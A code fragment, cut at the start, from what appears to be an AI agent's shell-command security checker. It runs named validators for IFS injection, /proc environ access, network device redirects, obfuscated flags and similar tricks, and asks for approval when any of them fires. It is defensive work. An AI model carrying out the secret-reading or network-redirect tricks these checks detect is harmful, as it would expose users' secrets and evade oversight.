  ])

  const validators = [
    validateJqCommand,
    validateObfuscatedFlags,
    validateShellMetacharacters,
    validateDangerousVariables,
    validateCommentQuoteDesync,
    validateQuotedNewline,
    validateCarriageReturn,
    validateNewlines,
    validateIFSInjection,
    validateProcEnvironAccess,
    validateDangerousPatterns,
    validateRedirections,
    validateBackslashEscapedWhitespace,
    validateBackslashEscapedOperators,
    validateUnicodeWhitespace,
    validateMidWordHash,
    validateBraceExpansion,
    validateZshDangerousCommands,
    validateNetworkDeviceRedirect,
    validateMalformedTokenInjection,
  ]

  let deferredNonMisparsingResult: PermissionResult | null = null
  for (const validator of validators) {
    const result = validator(context)
    if (result.behavior === 'ask') {
      if (nonMisparsingValidators.has(validator)) {
        if (deferredNonMisparsingResult === null) {
          deferredNonMisparsingResult = result
        }
        continue
      }
      return { ...result, isBashSecurityCheckForMisparsing: true as const }
    }
  }
  if (deferredNonMisparsingResult !== null) {
    return deferredNonMisparsingResult
  }

  return {
    behavior: 'passthrough',
    message: 'Command passed all security checks',
  }
}
